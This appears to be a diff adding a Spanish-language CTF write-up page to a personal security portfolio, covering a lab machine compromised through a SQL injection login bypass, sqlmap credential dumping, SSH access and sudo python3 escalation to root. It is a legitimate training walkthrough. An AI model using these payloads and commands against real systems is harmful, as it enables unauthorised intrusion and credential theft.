@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Library</title>
+  <link href="../style/estilo.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Máquina: CRYSTALTEAM</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el <!-- TODO: fecha --> | Categoría: WEB / SQLi </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una máquina Linux a través de una aplicación web vulnerable
+            a inyección SQL en su formulario de login. El objetivo es escalar desde el acceso web hasta
+            una shell como <code>root</code>.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            Escaneo de puertos completo:
+        </p>
+        <pre><code class="language-bash">
+sudo nmap -p- -open -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
+        </code></pre>
+        <p class="text-gray-300 mt-2 mb-4">
+            <!-- TODO: pegar acá el resultado real del nmap -->
+        </p>
+        <img src="../Assets/crystalteam/1.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="resultado nmap">
+
+        <p class="text-gray-300 mt-4">
+            En el reconocimiento web se encontró la ruta <code>/Certificacion</code>, que exponía un
+            formulario de login.
+        </p>
+    </section>
+
+    <!-- Explotación -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Explotación</h2>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">1) Bypass de login por SQLi</h3>
+        <p class="text-gray-300 mb-4">
+            Se probó una inyección clásica de bypass de autenticación en el campo de usuario:
+        </p>
+        <pre><code class="language-sql">
+admin' OR '1'='1'-- -
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            El login se saltó sin necesidad de contraseña válida, confirmando la inyección SQL.
+            Se capturó la petición y se guardó en <code>request.txt</code> para automatizar la
+            explotación con sqlmap.
+        </p>
+        <img src="../Assets/crystalteam/2.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="petición capturada">
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">2) Enumeración con sqlmap</h3>
+        <p class="text-gray-300 mb-4">
+            Listado de bases de datos disponibles:
+        </p>
+        <pre><code class="language-bash">
+sqlmap -r request.txt --batch --dbs
+        </code></pre>
+        <img src="../Assets/crystalteam/3.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="bases de datos encontradas">
+
+        <p class="text-gray-300 mt-4">
+            Listado de tablas dentro de la base <code>inicio</code>:
+        </p>
+        <pre><code class="language-bash">
+sqlmap -r request.txt -D inicio --tables
+        </code></pre>
+        <img src="../Assets/crystalteam/4.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="tablas encontradas">
+
+        <p class="text-gray-300 mt-4">
+            Columnas de la tabla <code>personales</code>:
+        </p>
+        <pre><code class="language-bash">
+sqlmap -r request.txt -D inicio -T personales --columns
+        </code></pre>
+        <img src="../Assets/crystalteam/5.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="columnas encontradas">
+
+        <p class="text-gray-300 mt-4">
+            Extracción de credenciales:
+        </p>
+        <pre><code class="language-bash">
+sqlmap -r request.txt \
+-D inicio \
+-T personales \
+-C usuario,contrasena,token \
+--dump
+        </code></pre>
+        <img src="../Assets/crystalteam/6.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="credenciales extraídas">
+
+        <p class="text-gray-300 mt-4">
+            Resultado del dump:
+        </p>
+        <pre><code class="language-text">
+usuario   | contrasena
+alejandro | hanka
+pinmar    | PI7Tmy
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            De las dos credenciales obtenidas, solo <code>alejandro</code> permitió autenticación por SSH.
+        </p>
+
+        <h3 class="text-xl font-semibold mb-2 mt-6">3) Escalada de privilegios</h3>
+        <p class="text-gray-300 mb-4">
+            Ya autenticado como <code>alejandro</code> vía SSH, se revisaron los permisos de sudo:
+        </p>
+        <pre><code class="language-bash">
+alejandro@119e0dd98d2b:~$ sudo -l
+Matching Defaults entries for alejandro on 119e0dd98d2b:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty
+
+User alejandro may run the following commands on 119e0dd98d2b:
+    (ALL) NOPASSWD: /usr/bin/python3
+        </code></pre>
+        <p class="text-gray-300 mt-4">
+            <code>python3</code> sin restricciones permite ejecutar código arbitrario y obtener una
+            shell (técnica documentada en GTFOBins):
+        </p>
+        <pre><code class="language-bash">
+alejandro@119e0dd98d2b:~$ sudo /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+root@119e0dd98d2b:/home/alejandro# id
+uid=0(root) gid=0(root) groups=0(root)
+        </code></pre>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Se obtuvo acceso como <code>root</code>, confirmado con <code>id</code>.
+            <!-- TODO: agregar flag/contenido de /root si lo tenés -->
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
